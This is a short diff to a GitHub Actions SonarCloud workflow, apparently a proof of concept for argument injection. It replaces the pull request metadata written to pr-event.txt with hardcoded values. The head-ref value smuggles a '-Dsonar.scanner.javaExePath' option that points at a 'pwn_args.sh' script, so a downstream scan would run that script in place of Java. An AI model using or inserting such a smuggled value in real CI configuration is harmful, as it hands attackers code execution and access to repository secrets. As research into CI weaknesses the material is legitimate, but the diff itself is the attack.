@@ -11,12 +11,8 @@ jobs:
               uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
             - name: Run SonarCloud scan
               shell: bash
-              env:
-                  PR_NUMBER: ${{ github.event.pull_request.number }}
-                  PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
-                  PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
               run: |
-                  printf '%s\n' "$PR_NUMBER" "$PR_HEAD_REF" "$PR_BASE_REF" > pr-event.txt
+                  printf '%s\n' "2" "x -Dsonar.scanner.javaExePath=/home/runner/work/gab-poc-sonar-javaexe/gab-poc-sonar-javaexe/pwn_args.sh" "main" > pr-event.txt
             - name: 'Prepare output artifact'
               shell: bash
               run: |
